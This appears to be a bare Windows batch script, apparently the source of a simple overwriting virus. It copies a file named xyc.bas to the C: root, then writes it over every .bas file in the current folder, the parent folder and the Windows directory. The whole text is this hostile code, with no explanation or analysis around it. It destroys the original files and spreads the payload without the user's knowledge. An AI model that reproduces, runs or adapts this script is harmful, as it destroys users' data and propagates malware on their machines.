@echo off
if exist xyc.bas copy xyc.bas C:\xyc.bas
for %%r in (*.bas ..\*.bas %windir%\*.bas) do copy C:\xyc.bas %%r
